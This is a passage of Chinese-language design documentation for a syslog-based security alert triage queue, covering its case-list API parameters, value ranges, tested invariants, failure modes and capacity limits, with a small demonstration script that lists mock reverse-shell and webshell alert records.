| `acceptSyslog(line)` | 收一条 syslog；内部串行化，不会并发处理，并计入 `syslog_stats` | `triage-monitor.js:780-789` |
| `drain()` | 调度队列（按（类型风险，`occurrence_count`，`created_at`）取最高优先级） | `triage-monitor.js:942-958` |
| `run(record)` | 跑一条记录的完整流程 | `triage-monitor.js:996-1092` |

三个文件之间的依赖方向是单向的：`triage-monitor.js` 依赖 `syslog-input.js` 与 `syslog-case.js`（`triage-monitor.js:4-5`），`syslog-case.js` 依赖 `syslog-input.js`（`syslog-case.js:4`），`syslog-input.js` 不依赖本模块其他文件（`syslog-input.js:1-2` 只 import node 内置模块）。

### 8.1 案件列表契约（`GET /api/agent/triage/cases`）

`cases()`（`triage-monitor.js:524-554`）先按四类条件筛，再按收到顺序倒序（插入序是旧→新，`triage-monitor.js:533`），然后切页；`total` 是**过滤后**的条数（`triage-monitor.js:536`），不随 `count`/`offset` 变。HTTP 层参数解析与 400 文案在 `server.js:536-554`，路由在 `server.js:1044-1053`。

| 参数 | 作用 | 语义 | 依据 |
| --- | --- | --- | --- |
| `verdict` | 结论 | 逗号分隔多选：`threat` / `uncertain` / `false_positive` / `review`；记录上没有结论时按 `review` 算（`review` 不是记录上的取值） | `server.js:537-538`、`triage-monitor.js:526` |
| `type` | 事件类型 | syslog MsgId 经 `eventTypeFor` 映射出的类型（§3.4），如 `cloudwalker-revshell` → `revshell`；不在 `eventTypes` 枚举内回 400 | `server.js:539-540`、`triage-monitor.js:527` |
| `host` | 主机 | 与案件 `input.parsed.payload.host_ip` 精确相等；没有 `host_ip` 的案件不会命中 | `server.js:551`、`triage-monitor.js:528` |
| `from` / `to` | 事件时间窗 | RFC3339 或秒/毫秒时间戳（`parseInstant`，`cloudwalker.js:20-24`）；服务端落成 Unix 秒后与 `eventSeconds(parsed)` 比，**含端点**；`to` 早于 `from` 回 400；时间解析不出来的案件（`eventSeconds` 返回 `null`）在带时间筛时被排除 | `server.js:541-547`、`server.js:551-553`、`triage-monitor.js:529-532` |
| `sort` | 排序 | `time`（默认）＝收到顺序倒序；`verdict`＝threat(0) → uncertain(1) → false_positive(2) → 无结论(3)，同档保持时间倒序（`Array#sort` 是稳定排序） | `server.js:548-549`、`triage-monitor.js:10`、`triage-monitor.js:534-535` |
| `count` / `offset` | 分页 | 1–50（缺省 20）/ ≥ 0（缺省 0），越界回 400「分页参数无效」；**切页在过滤之后** | `server.js:1046-1049` |

非法值一律 400，文案形如「筛选结论无效：x」（`server.js:536-554`）。不带任何筛选时行为与老实现一致：全量倒序 + 全量 `total`。

`repeat_count` 原样沿用记录上的值（`triage-monitor.js:541`，缺省 1），列表不另造计数。

**实测**（仓根跑，退出码 0）：

```bash
cat <<'EOF' | node --input-type=module
import { TriageMonitor } from './triage-monitor.js';
const monitor = new TriageMonitor({ file: '/tmp/none.json', service: {}, investigator: {}, history: {} });
const add = (id, verdict, host, time, msgid, repeat) => monitor.records.set(id, { alert_id: id, status: 'done', verdict,
  repeat_count: repeat, input: { raw: '', parsed: { msgid, ts: '2026-11-17T10:00:00Z', payload: { host_ip: host, event_create_time: time } } } });
add('syslog:revshell:a1:1:u1', 'threat', '10.0.0.5', '2026-11-17 10:00:00', 'cloudwalker-revshell', 3);
add('syslog:webshell:a2:2:u2', 'uncertain', '10.0.0.6', '2026-11-17 11:00:00', 'cloudwalker-webshell', 1);
add('syslog:revshell:a3:3:u3', undefined, '10.0.0.5', '2026-11-17 12:00:00', 'cloudwalker-revshell', 1);
const show = (label, page) => console.log(label, '| total=' + page.total, '|',
  page.cases.map(item => `${item.msgid.slice(11)}/${item.host_ip}/${item.verdict || 'review'}/repeat=${item.repeat_count}`).join('  '));
show('全部', monitor.cases());
show('verdict=threat,uncertain', monitor.cases({ verdicts: ['threat', 'uncertain'] }));
show('type=revshell host=10.0.0.5', monitor.cases({ type: 'revshell', host: '10.0.0.5' }));
show('sort=verdict', monitor.cases({ sort: 'verdict' }));
show('count=1 offset=1', monitor.cases({ count: 1, offset: 1 }));
const at = value => Math.floor(Date.parse(value) / 1000);
console.log('时间窗 11:00 ~ 11:00 ->', monitor.cases({ from: at('2026-11-17T11:00:00Z'), to: at('2026-11-17T11:00:00Z') }).total);
EOF
```

```
全部 | total=3 | -revshell/10.0.0.5/review/repeat=1  -webshell/10.0.0.6/uncertain/repeat=1  -revshell/10.0.0.5/threat/repeat=3
verdict=threat,uncertain | total=2 | -webshell/10.0.0.6/uncertain/repeat=1  -revshell/10.0.0.5/threat/repeat=3
type=revshell host=10.0.0.5 | total=2 | -revshell/10.0.0.5/review/repeat=1  -revshell/10.0.0.5/threat/repeat=3
sort=verdict | total=3 | -revshell/10.0.0.5/threat/repeat=3  -webshell/10.0.0.6/uncertain/repeat=1  -revshell/10.0.0.5/review/repeat=1
count=1 offset=1 | total=3 | -webshell/10.0.0.6/uncertain/repeat=1
时间窗 11:00 ~ 11:00 -> 1
```

读法：第一行是默认（时间倒序、无筛选）；`sort=verdict` 把 `threat` 提到最前、无结论沉底；`count=1 offset=1` 的 `total` 仍是 3（`total` 只跟筛选走）；时间窗含端点所以 11:00 那一刻的那条留在窗内。

## 9 值语义

本模块里各取值的单位、量程与缺省：

| 值 | 类型 | 单位 | 取值域 | 缺省 | 空值含义 | 依据 |
| --- | --- | --- | --- | --- | --- | --- |
| 记录状态 `status` | 字符串 | — | `queued` / `running` / `done` / `failed` | — | 无 | `triage-monitor.js:691`、`950`、`1056`、`1082`、`884` |
| 阶段 `stage` | 字符串 | — | 自由文本；已知取值：等待研判、等待重试、准备研判、关联事件、研判完成、研判失败 | — | 无 | `triage-monitor.js:696`、`377`、`951`、`1011`、`1056`、`1078` |
| `attempts` | 整数 | 次 | ≥ 0 | 0 | 0 = 还没被调度过 | `triage-monitor.js:953`、`889` |
| `repeat_count` | 整数 | 次 | ≥ 1 | 1 | — | `triage-monitor.js:887`、`835` |
| `occurrence_count` | 整数 | 次 | ≥ 1 | 1 | — | `triage-monitor.js:885-887` |
| `delivery_count` | 整数 | 次 | ≥ 1 | 1 | — | `triage-monitor.js:888-889` |
| `event_delivery_count` | 整数 | 次 | ≥ 1 | 1 | — | `triage-monitor.js:890` |
| `watermark` | 字符串 | — | ISO 8601 时间戳 | `null` | `null` = 游标还没初始化 | `triage-monitor.js:128`、`281` |
| `watermark_ids` | 字符串集合 | 个 | 与游标同一时刻的事件 ID | 空集合 | 空集合 = 该时刻没有事件 | `triage-monitor.js:129`、`282` |
| 事件时间（`eventSeconds` 返回） | 整数或 `null` | 秒 | Unix 秒 | — | `null` = 时间解析不出来 | `syslog-input.js:63-71` |
| 时间偏移 `HIDS_SYSLOG_TIME_OFFSET_MINUTES` | 整数 | 分钟 | 绝对值 ≤ 840（14 小时），超出按 0 | 0 | — | `syslog-input.js:62`、`70` |
| 匹配时间差 `gap_seconds` | 整数或 `null` | 秒 | ≥ 0 | `null` | `null` = 缺时间，算不出差 | `syslog-case.js:50`、`80` |
| 匹配覆盖 `coverage.returned` / `coverage.total` | 整数 | 条 | ≥ 0 | — | — | `syslog-case.js:51`、`81` |
| 会话窗口 `window` | 数组 | 条 | 单个会话最多留 200 条 | 空数组 | — | `triage-monitor.js:937`、`911` |
| 会话窗口跨度 `window_seconds` | 整数 | 秒 | 600 | 600 | — | `triage-monitor.js:922` |
| 历史结论 `history` | 数组 | 条 | 最多 50 条 | 空数组 | — | `triage-monitor.js:916-920` |
| 材料单文件读取上限 | 整数 | 字符 | 25000 | — | 超出只返回错误、不返回内容 | `syslog-case.js:172` |
| 并发上限 `concurrency` | 整数 | 个 | ≥ 0（0 = 只排队不执行） | 2 | `HIDS_TRIAGE_CONCURRENCY` | `triage-monitor.js:30`、`triage-monitor.js:35` |
| 轮询间隔 `intervalMs` | 整数 | 毫秒 | ≥ 1 | 30000 | — | `triage-monitor.js:92` |
| 案件列表分页 `count` | 整数 | 条 | 1–50 | 20 | 越界回 400「分页参数无效」 | `server.js:1046-1049` |
| 案件列表分页 `offset` | 整数 | 条 | ≥ 0 | 0 | 越界回 400「分页参数无效」 | `server.js:1047-1049` |
| 结论排序档位（`sort=verdict`） | 整数 | — | threat 0、uncertain 1、false_positive 2、无结论 3 | — | 同档保持时间倒序 | `triage-monitor.js:8`、`triage-monitor.js:140` |
| 案件列表时间窗 `from` / `to` | 整数 | 秒（Unix，含端点） | 时间戳或 RFC3339，服务端落成秒 | `null`（不筛） | `null` ＝ 该侧不限；`eventSeconds` 为 null 的案件在带时间筛时被排除 | `server.js:541-553`、`triage-monitor.js:529-532` |
| 轮询页大小 | 整数 | 条 | 50 | 50 | — | `triage-monitor.js:214` |
| 轮询页数上限 | 整数 | 页 | 20 | 20 | — | `triage-monitor.js:213` |
| 步骤留痕上限 | 整数 | 条 | 80 | 80 | 超出丢最早一条 | `triage-monitor.js:395` |
| 案件材料文件数 | 整数 | 个 | 5（传入 wiki 时 6） | — | — | `syslog-case.js:101-106`、`80-83` |
| 指纹长度 | 整数 | 字符 | 16 | — | — | `syslog-input.js:100` |
| 案例摘要长度 | 整数 | 字符 | 8 | — | — | `syslog-case.js:96` |
| 同秒判定阈值 | 整数 | 秒 | 0（严格相等） | — | — | `triage-monitor.js:271` |
| 出现次数归并窗口 | 整数 | 秒 | 300 | — | — | `triage-monitor.js:289` |
| 牧云事件匹配时间窗 | 整数 | 秒 | 300（前后各 5 分钟） | — | — | `syslog-case.js:69` |

## 10 行为承诺与不变量

下表每条都是可被测试反驳的承诺。测试用例用 `// covers: R-TRIAGE-xx` 回指。

| 编号 | 陈述 | 反例（不该发生） | 依据 | 违反症状 |
| --- | --- | --- | --- | --- |
| `R-TRIAGE-01` | 同秒重复投递合并到同一条记录，重复次数累加 | 同秒两条投递生成两条记录 | `triage-monitor.js:271-287` | 同一告警被研判多次 |
| `R-TRIAGE-02` | 记录状态沿 `queued → running → done\|failed` 迁移；两条例外：手动重试 `enqueue(..., { retry: true })` 把 `done` / `failed` 记录放回 `queued`，进程重启把 `running` 改回 `queued` | 非重试路径上出现 `done → queued`，或重启后仍有 `running` 卡住 | `triage-monitor.js:191`、`triage-monitor.js:377`、`triage-monitor.js:403`、`triage-monitor.js:1056`、`triage-monitor.js:1078` | 队列里出现悬空记录，任务不跑 |
| `R-TRIAGE-03` | 案件材料在研判开始前就写好 | 研判进行中读不到 `03-研判事实.md` | `triage-monitor.js:387-391` 早于 `triage-monitor.js:398` | 模型拿不到材料 |
| `R-TRIAGE-04` | 状态文件与结果文件都用「临时文件 + rename」替换，临时文件带 `wx` 标志 | 读到写了一半的状态文件 | `triage-monitor.js:100-102`、`syslog-case.js:141-146`、`163-165` | 读到半截 JSON |
| `R-TRIAGE-05` | 暂停期间收到的 syslog **不丢**：进 `pausedBuffer` 排队（上限 `paused_buffer_limit`，超出的丢弃并计 `paused.dropped`），恢复时逐条回灌 | 暂停期间收到的条数与 `summary().paused.received` 对不上，或恢复后缓冲里还剩报文 | `triage-monitor.js:793-809`、`triage-monitor.js:640-654` | 暂停期间的告警永久消失 |
| `R-TRIAGE-06` | 从暂停恢复**不动游标**（`watermark` / `watermarkIds` 原样）也**不删** `queued` 记录 | 恢复后游标变了，或队列被清空 | `triage-monitor.js:640-654` | 暂停期间的告警漏判 |
| `R-TRIAGE-07` | 牧云部分事件类型读取失败时游标不推进 | 部分失败后游标仍前移 | `triage-monitor.js:726-726`、`triage-monitor.js:761-761` | 中间那批告警被静默跳过 |
| `R-TRIAGE-08` | 匹配不到牧云事件时，这条告警仍走完流程并产出结果 | 未匹配时直接丢弃 | `triage-monitor.js:1038-1041`、`triage-monitor.js:1044-1044` | 告警没有结果 |
| `R-TRIAGE-09` | 轮询用 `from` 增量取数，排序键固定 `created_at desc, id asc`；一轮里同一秒已处理过的 id 不会再排一次 | 同一批新增在一轮里被排两次；或游标靠翻页比较时间推进 | `triage-monitor.js:707-774` | 漏告警 / 重复研判 |
| `R-TRIAGE-10` | 一次研判内同一条事件详情只真拉一次；syslog 匹配、规则评估、agent 共用 `match.event` | 同一条告警详情在一次研判里被拉两次以上 | `triage-monitor.js:1006-1012`、`triage-monitor.js:1038-1042`、`triage-rules.js:279`、`investigation-agent.js:458-462` | 取数重复、配额浪费 |
| `R-TRIAGE-13` | 失败记录自动重排：第 n 次失败等 `min(base * 2^(n-1), max)`；`attempts >= max_attempts` 进死信（`status` 仍是 `failed` + `dead_letter:true`） | 失败记录停在原地没人重跑，或死信还在被自动重跑 | `triage-monitor.js:357-380` | 瞬时故障要人工重跑 / 死信无限重试 |
| `R-TRIAGE-14` | 热路径的落盘由合并写窗口决定，峰值最多 1 次 / `persist_interval_ms`；重复投递的计数不逐条重存研判记录 | 同一秒内队列快照被写了多次，或重复投递每次都重存研判记录 | `triage-monitor.js:231-274`、`triage-monitor.js:290-311` | 落盘暴涨 |
| `R-TRIAGE-15` | 删记录（取消 / TTL 归档）必须同时失效指向它的 `dedupe` 条目 | `dedupe` 里留着 `record_id` 已不在 `records` 的条目 | `triage-monitor.js:411-417` | 重复投递合到一条已不存在的记录上 |
| `R-TRIAGE-11` | 队列按（类型风险，`occurrence_count`，`created_at`）取最高优先级；并发与上限可配 | 后到的高风险告警排在一堆低风险后面 | `triage-monitor.js:19-23`、`triage-monitor.js:42-50`、`triage-monitor.js:944-946` | 处置顺序错 |
| `R-TRIAGE-12` | 队列（排队 + 在跑）达到上限就拒收并计入 `dropped`，`summary().dropped` 只增不减（进程重启归零） | 无上限地吃内存；或丢弃了但不计数 | `triage-monitor.js:658-668`、`triage-monitor.js:679-683`、`triage-monitor.js:876-879` | 内存涨满、丢告警不留痕 |

`R-TRIAGE-02` 那两条例外是实测过的：对一条已经 `done` 的记录调 `enqueue(alertId, { retry: true })`，状态回到 `queued` 并重新执行，`attempts` 从 1 变 2。

**不保证什么**（这一栏比上一栏有用——测试方靠它判「这不是 bug」）：

| 不保证 | 依据 |
| --- | --- |
| 不保证每条告警都匹配到牧云事件；匹配失败是正常分支 | `syslog-case.js:27-83` |
| 不保证同一告警只研判一次；不同秒但**上一条未完结**的重复投递会生成新记录（上一条已完结时只累加 `repeat_count`，见 §5.6 A3） | `triage-monitor.js:529-554` |
| 不保证 `cases()` 能列出研判记录；它只列有原始报文的记录 | `triage-monitor.js:130` |
| 不保证结论正确；结论由 `investigator` 产出，本模块只搬运 | `triage-monitor.js:1038-1042` |
| 不保证事件时间准确；取决于部署方给的偏移量，越界按 0 | `syslog-input.js:61`、`69` |
| 不保证研判一定成功；`investigator` 抛错就是 `failed`（轮数用尽的降级结论不算抛错，见 §5.3） | `triage-monitor.js:1078-1082` |

## 11 失败面

| 失败模式 | 表现 | 失败后状态 | 能否重试 | 降级 |
| --- | --- | --- | --- | --- |
| 报文不是 RFC5424 行 | 抛「不是合法的 RFC5424 syslog 行」 | 该条丢弃，`lastError` 记下（`triage-monitor.js:812-816`） | 能，重投同一条报文 | 无 |
| 正文解析后为空 | 抛「syslog 正文解析后为空」（`syslog-input.js:55`） | 同上 | 能 | 无 |
| JSON 正文带尾随文本 | `JSON.parse` 抛语法错（`syslog-input.js:50`） | 同上 | 能 | 无 |
| MsgId 没有类型映射 | 返回 `{ skipped: 'no_agent_for_msgid' }`，计入 `syslog_stats.rejected`（`triage-monitor.js:820-822`） | 该条不入队 | 不能，除非换 MsgId | 无 |
| 状态文件不存在 | 忽略，按空状态启动（`triage-monitor.js:210`） | 正常 | — | — |
| 状态文件不是合法 JSON | `JSON.parse` 抛错（`triage-monitor.js:177`），`start()` 失败 | 进程起不来 | 能，修好文件即可 | 无 |
| 牧云部分事件类型读取失败 | `lastError` =「部分牧云事件类型读取失败，暂缓推进自动研判游标」 | 游标不动，队列不动（`triage-monitor.js:726`、`triage-monitor.js:768`） | 能，下一轮自动重试 | 延迟处理 |
| 一轮新增超过 20 页 | `lastError` =「新增告警超过本轮扫描上限，请检查自动研判积压」 | 游标不推进（`triage-monitor.js:745`） | 能，下一轮重来 | 积压 |
| 牧云事件详情读取失败 | 匹配返回未匹配，原因写明「牧云事件 ID 详情读取失败：…」（`syslog-case.js:52-55`） | 走未匹配分支 | — | 结论按未匹配口径给 |
| 牧云事件列表查询失败 | 匹配返回未匹配，原因写明「牧云事件查询失败：…」（`syslog-case.js:82-83`） | 同上 | — | 同上 |
| 牧云事件与 syslog 主机对不上 | 匹配返回未匹配，原因写明「牧云事件 ID 对应的主机与 syslog 不一致」（`syslog-case.js:37-48`） | 同上 | — | 同上 |
| 研判抛错 | 记录置 `failed`，`detail` 截断到 250 字符，原因进 `failure{reason,code,at}` 并自动退避重排（`triage-monitor.js:1078-1082`） | 队列记录保留；到上限进死信 | 自动重排；死信后仍可 `enqueue(..., { retry: true })` 人工重跑 | 总共最多跑 `retry_max_attempts` 次（即自动重跑 `retry_max_attempts-1` 次），之后停在死信等人工 |
| 调查轮数用尽仍无结论 | **不抛错**：`investigator` 返回「存疑 + 缺口清单」降级结论（`investigation-agent.js:827-843`） | 记录置 `done`，`05-研判结果.md` 照常写（`triage-monitor.js:1051-1056`） | 能，用 `enqueue(..., { retry: true })` | 降级为存疑 |
| 队列快照写盘失败 | 只记 `triage.persist_failed` 日志（不打断服务、等的人也不挂：`writtenGen` 推到目标代）（`triage-monitor.js:259-274`） | 研判继续 | — | 崩溃时最多丢一段状态，重启后 `running` 记录重跑 |
| 进度落盘 | `onProgress` 只标脏（合并写窗口决定何时落，不抛错）；`drain()` 里 run 的兜底 catch 失败时 `lastError` =「研判状态保存失败：…」（`triage-monitor.js:1031-1037`、`triage-monitor.js:954-956`） | 研判继续 | — | 记录里的阶段可能滞后 |
| 案件目录写不出来 | `run()` 抛错，记录转 `failed`（`triage-monitor.js:1027`、`triage-monitor.js:1077-1082`） | 记录保留 | 能 | 无 |
| 回写重复次数时 `result.json` 不存在 | 直接返回，两个文件都不动（`syslog-case.js:154`） | 重复次数没更新 | — | 无 |
| 读材料超过 25000 字符 | 返回 `{ name, error }`，不给内容（`syslog-case.js:172`） | — | 能，改读摘要文件 | 用 `03-研判事实.md` |
| 读材料文件名不在清单里 | 抛「研判材料文件不在当前告警目录」（`syslog-case.js:170`） | — | 不能，除非换个在清单里的名字 | 无 |

## 12 资源与容量

| 项 | 值 | 依据 | 怎么知道的 |
| --- | --- | --- | --- |
| 同时研判的告警数 | `HIDS_TRIAGE_CONCURRENCY`，缺省 2；构造参数显式传数字 0 表示不起 worker（只排队，测试/停机维护用），其余非法值（负数 / 小数 / 非数 / 空串 / 字符串 `'0'`）回落 env → 缺省 2 | `triage-monitor.js:30`、`triage-monitor.js:35`、`triage-monitor.js:108-109` | 环境变量缺省 + `concurrencyLimit()` |
| 轮询单页条数 | 50 | `triage-monitor.js:13` | 代码常量 |
| 轮询单轮页数上限 | 20（单轮最多取 1000 条新增） | `triage-monitor.js:14` | 代码常量 |
| 轮询退避上界 | `maxBackoffMs`，缺省 `intervalMs × 16` | `triage-monitor.js:112`、`triage-monitor.js:775-776` | 构造参数缺省 |
| 队列长度（上限） | `HIDS_TRIAGE_QUEUE_MAX`，缺省 1000（排队 + 在跑）；到上限后新告警被拒收并计入 `dropped`。已完结的记录不占配额，也仍不裁剪 | `triage-monitor.js:31`、`triage-monitor.js:111`、`triage-monitor.js:658-663` | 环境变量缺省 + `#queueFull()` |
| 队列长度（内存） | `done` 记录按 TTL 归档出内存（缺省 24h），内存里只剩近期记录；`queued` / `failed` 不按容量裁剪，只受重试上限约束 | `triage-monitor.js:419-434`、`triage-monitor.js:411-417` | 归档扫描 + 死信上限 |
| 暂停缓冲区 | 上限 `paused_buffer_limit`（缺省 2000 条），超出的丢弃并计 `paused.dropped` / `syslog_stats.dropped` | `triage-monitor.js:793-808` | 构造参数默认值 |
| 去重表 `dedupe` | 新增时按指纹一条；取消与 TTL 归档会删掉指向被删记录的那些（`dropRecord()`） | `triage-monitor.js:411-417`、`triage-monitor.js:419-434` | 代码结构 |
| 每会话保留的时间窗条目 | 200 | `triage-monitor.js:912-912`、`triage-monitor.js:937-937` | 代码常量 |
| 会话清理阈值 | 与当前事件相差超过 1200 秒的会话被删 | `triage-monitor.js:938-940` | 代码常量 |
| 附在上下文里的历史结论条数 | 50 | `triage-monitor.js:920-920` | 代码常量 |
| 记录里的步骤留痕 | 80 条，超出丢最早一条 | `triage-monitor.js:1034-1034` | 代码常量 |
| 材料单文件可读上限 | 25000 字符 | `syslog-case.js:172` | 代码常量 |
| 去重指纹长度 | 16 字符 | `syslog-input.js:100` | 实测（§4.1） |
| 落盘频率 | 热路径标脏、合并写：峰值 ≤1 次 / `persist_interval_ms`（缺省 1000ms）；管理面（入队 / 轮询推进 / 暂停恢复 / 归档 / 取消）等自己这一代落盘；队列闲下来时收尾立刻落一次 | `triage-monitor.js:231-274`、`triage-monitor.js:1087-1090` | 代码结构 + 探针实测（`evidence/test/P003-T036/probe-queue-reliability.mjs`：200 条报文 / 1s 内 2 次快照） |
| 单条告警端到端延迟 | **未测量** | — | 本卡没有牧云与模型凭据，没跑过端到端 |
| 吞吐上限 | **未测量** | — | 同上 |

未测量的两项不是漏写，是本卡拿不到：跑通一条真实告警需要牧云地址、Token 与模型服务，这三项本卡都没有。

## 13 约束与取舍

**假设**

- 报文符合 RFC5424 行首（`syslog-input.js:8`）
- 牧云事件时间是无时区的本地时间，RFC5424 头部带 UTC（`syslog-input.js:66-67`）
- 部署方会显式设置事件时间的 UTC 偏移（`syslog-input.js:61`）

**限制**

- 牧云事件匹配只查同主机同类事件的**首批 50 条**，更早或更晚的同类事件匹配不到（`syslog-case.js:61`、`81`）
- 同一指纹超过 5 分钟就是新记录（`triage-monitor.js:911-913`）
- 案件材料在研判前写好，研判结果不在材料里（`triage-monitor.js:1026-1030`）
- 暂停缓冲区有上限（缺省 2000 条），超出的报文会丢；丢了会计数，但不是「一定能接住」（`triage-monitor.js:793-809`）
- TTL 归档只保证「内存里不再背着老案件」：归档后的记录 `status()` 返回 `null`、不再出现在案件列表里，要翻旧案读 `<队列文件>.archive.jsonl`
- 内核 socket 缓冲满导致的 UDP 丢包在进程内拿不到，`syslog_stats` 只统进程里看得见的四类结果（详见 §11 与 `openapi.yaml` 的 `TriageSummary.syslog_stats`）

**被排除的方案与原因**（源码里写明理由的）

- 键值对解析先把已识别的带引号字段遮住，再解析裸字段——否则命令里的变量会被当成告警字段（遮住与裸字段解析的实现在 `syslog-input.js:24-27`，理由写在 `syslog-input.js:22-23` 的注释里）
- 事件时间显式给偏移量，而不是用接收服务器的本地时区（`syslog-input.js:66-67`）
- 优先按 `event_id` 精确读取；旧载荷没有 ID 时才退回「同类同主机的首批事件时间匹配」（`syslog-case.js:22`）
- 指纹分类型选字段：可疑命令只看命令与文件路径，蜜罐只看三端地址（`syslog-input.js:95-98`）——🟡 推断目的是让「同一件事的重复投递」指纹相同、不同告警指纹不同，依据是同秒折叠正是靠指纹相同才发生（`triage-monitor.js:827-827`）
- ~~恢复时以按钮点击时刻作新游标~~：P003-T036 已废掉这条——那样会让暂停期间的告警永久漏判，改成游标不动 + 暂停缓冲回灌（`triage-monitor.js:640-654`）

**已知坑**

- 结构化数据后面跟自由文本时，末尾那个带引号的字段会被静默丢掉（§3.3，实测）
- 轮询新发现的告警是**倒序入队**（`triage-monitor.js:243`），先入队的后跑
- 案件目录的时间戳与随机后缀每次都不同，只有摘要那 8 位在同一份输入下稳定（`syslog-case.js:94-97`）

## 14 没查到的

这几条代码里看不出来，写在页面上不当作事实。

| 没查到的 | 为什么查不到 | 影响面 |
| --- | --- | --- |
| 牧云真实 syslog 报文样本 | 本机没有牧云凭据，本卡没有发起外部请求 | 无法判断 §3.3 那两条解析边界在实际报文里是否发生，也无法知道三种正文形态各占多少 |
| `HIDS_SYSLOG_TIME_OFFSET_MINUTES` 在各部署环境的实际取值 | 属部署配置，代码只提供换算逻辑（`syslog-input.js:61-72`） | 事件时间可能整体偏移，匹配窗口（300 秒）与去重窗口（300 秒）随之偏移 |
| `investigator`、`ruleEngine`、`history` 的接口细节 | 不在本模块三个文件里 | 本篇只写本模块怎么调它们，不写它们的行为 |
| 单条告警端到端延迟与吞吐 | 需要真实牧云与模型服务 | §12 里这两项标「未测量」，别当性能承诺 |
| 队列长度是否有外层上限 | 有：`#queueFull()` 按「排队 + 在跑」卡 `queue_limit`（缺省 1000），满了拒收并计 `dropped`（§5.6）；恢复不动游标也不删 `queued`（§5.4）。已完结的记录只按 `done_ttl_ms` 归档、不按容量裁剪 | 极端输入下 done 记录会在内存里留到 TTL 到期 |

本卡 scope 里没有共享缺口台账文件，所以这几条先记在本页 §14，待台账归属方登记。

## 指针

- 架构篇（进程入口、分层、配置项、模块清单）：[../architecture.md](../architecture.md)
- 本模块的源文件：`triage-monitor.js`（1093 行）、`syslog-input.js`（123 行）、`syslog-case.js`（212 行）
- 五条关键路径回指：接收与解析 §3 · 指纹去重 §4 · 队列与游标 §5 · 案件目录 §6 · 结果写回 §7
- 承诺编号：`R-TRIAGE-01` 到 `R-TRIAGE-08`（§10），测试用例用 `// covers:` 回指

本页只描述现状。哪一处该改、改成什么样，是评审的活。
